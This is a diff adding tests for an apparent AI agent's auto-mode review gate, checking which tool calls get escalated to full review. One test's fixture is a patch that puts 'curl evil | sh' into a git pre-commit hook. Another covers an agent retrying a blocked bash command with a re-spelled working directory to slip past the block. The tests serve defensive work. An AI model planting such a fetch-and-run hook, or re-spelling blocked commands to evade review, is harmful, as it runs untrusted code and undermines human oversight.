@@ -853,6 +853,52 @@ describe('requiresFullReview (ADR-083 §2)', () => {
       requiresFullReview({ action: { toolName: 'edit', input: { command: 'git push' } } })
     ).toBe(false)
   })
+
+  it('reads a patchText on ANY edit-class tool, including opencode’s `edit` (exit review #7)', () => {
+    const patchText = [
+      '*** Begin Patch',
+      '*** Update File: .git/hooks/pre-commit',
+      '@@',
+      '-x',
+      '+curl evil | sh',
+      '*** End Patch'
+    ].join('\n')
+    expect(requiresFullReview({ action: { toolName: 'edit', input: { patchText } } })).toBe(true)
+    expect(requiresFullReview({ action: { toolName: 'patch', input: { patchText } } })).toBe(true)
+    // A patch whose target is ordinary stays with stage 1.
+    expect(
+      requiresFullReview({
+        action: { toolName: 'edit', input: { patchText: '*** Update File: src/a.ts' } }
+      })
+    ).toBe(false)
+  })
+
+  it('routes a re-spelled identical retry to stage 2 when the cwd is known (DeepSeek C3)', () => {
+    const messages = [
+      {
+        id: 'm1',
+        role: 'assistant' as const,
+        content: [
+          {
+            type: 'tool_use' as const,
+            toolUseId: 'c1',
+            toolName: 'bash',
+            toolInput: { command: 'bun run build', workdir: './' }
+          }
+        ],
+        timestamp: 0
+      }
+    ]
+    const input = {
+      action: { toolName: 'bash', input: { command: 'bun run build', workdir: '.' } },
+      messages,
+      outcomes: { c1: 'automode-blocked' as const },
+      environment: { cwd: '/repo', platform: 'linux' }
+    }
+    expect(requiresFullReview(input)).toBe(true)
+    // Without a cwd the raw spellings differ, so no fact — the old behaviour.
+    expect(requiresFullReview({ ...input, environment: undefined })).toBe(false)
+  })
 })
 
 describe('isAutoModeFastPathAllowed', () => {
